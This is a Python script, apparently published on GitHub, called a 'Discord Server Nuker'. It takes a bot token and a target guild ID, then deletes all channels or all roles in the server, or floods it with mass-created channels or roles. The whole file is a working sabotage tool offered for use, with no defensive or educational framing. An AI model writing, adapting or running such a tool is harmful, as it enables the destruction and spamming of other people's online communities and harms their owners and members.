import nextcord, os, time
from nextcord.ext import commands

intents = nextcord.Intents.all()
bot = commands.Bot(intents=intents)

def setupNuker():
    global token
    global guild_id
    token = input('        Type Your Discord Bot Token > ')
    guild_id = input('        Type Target Guild Id > ')
    print('        Success To Save Data')
    time.sleep(2)
    return nukerStart()

def About():
    print("""
        Created By. Online#0007 ( 967816978683265025 )
        Github. https://github.com/online1004
        License. GNU General Public License v3.0
        Last Update. 2023.01.26 Version 1.0.0
        Warning. When using it, all responsibility is up to you.

        Thank You For Using.
    """)

def StartNukeServer():
    os.system('cls')
    nukingType = input("""
        ┌─  Discord Server Nuker ───────────────────────────────────┐
        │  [1] Delete Channel                                       │
        │  [2] Create Channel                                       │
        │  [3] Delete Role                                          │
        │  [4] Create Role                                          │
        └───────────────────────────────────────────────────────────┘
        > """)
    @bot.event
    async def on_ready():
        info = bot.get_guild(int(guild_id))
        if nukingType == '1':
            for channel in info.channels:
                try:
                    await channel.delete()
                    print(f'        Success > Channel Delete Log {channel.name} {channel.id}')
                except:
                    print(f'        Error > Cannot Delete Channel {channel.name} {channel.id}')
            print('        Finish Nuke Server')
            time.sleep(2)
            os.system('exit')
        elif nukingType == '2':
            ch_name = input('        Type Channel Name > ')
            ch_range = int(input('        Type Channel Number > '))
            for i in range(ch_range):
                try:
                    channel = await info.create_text_channel(name=ch_name)
                    print(f'        Success > Channel Create Log {channel.name} {channel.id}')
                except:
                    print(f'        Error > Cannot Create Channel')
            print('        Finish Nuke Server')
            time.sleep(2)
            os.system('exit')
        elif nukingType == '3':
            for role in info.roles:
                try:
                    await role.delete()
                    print(f'        Success > Role Delete Log: {role.name} {role.id}')
                except:
                    print(f'        Error > Cannot Delete Role {role.name} {role.id}')
            print('        Finish Nuke Server')
            time.sleep(2)
            os.system('exit')
        elif nukingType == '4':
            r_name = input('        Type Role Name > ')
            r_range = int(input('        Type Role Number > '))
            for i in range(r_range):
                try:
                    role = await info.create_role(name=r_name)
                    print(f"        Success > Role Create Log: {role.name} ({role.id})")
                except:
                    print(f'        Error > Cannot Create Role')       
            print('        Finish Nuke Server')
            time.sleep(2)
            os.system('exit')
        else:
            print('        ERROR > Command Is Not Correct')
            os.system('exit')
    bot.run(token)

def nukerStart():
    os.system('cls')
    os.system('color a')
    print("""
        > Created By. Online#0007 
        > https://github.com/online1004
    """)
    data = input("""
        ┌─  Discord Server Nuker ───────────────────────────────────┐
        │  [1] Start Setting                                        │
        │  [2] Start Nuker                                          │
        │  [3] About                                                │
        │  [4] Exit                                                 │
        └───────────────────────────────────────────────────────────┘
        > """)
    if data == '1':
        try:
            if len(token) < 10:
                return setupNuker()
            else:
                print('        You Already Setup Nuker')
                time.sleep(2)
                os.system('cls')
                return nukerStart()
        except:
            return setupNuker()
    elif data == '2':
        try:
            token
            return StartNukeServer()
        except:
            print('        You Do not Setup Nuker')
            time.sleep(10)
            return nukerStart()
    elif data == '3':
        About()
        return os.system('exit')
    elif data == '4':
        os.system('exit')
    else:
        print('        ERROR > Command Is Not Correct')
        time.sleep(2)
        return nukerStart()

nukerStart()
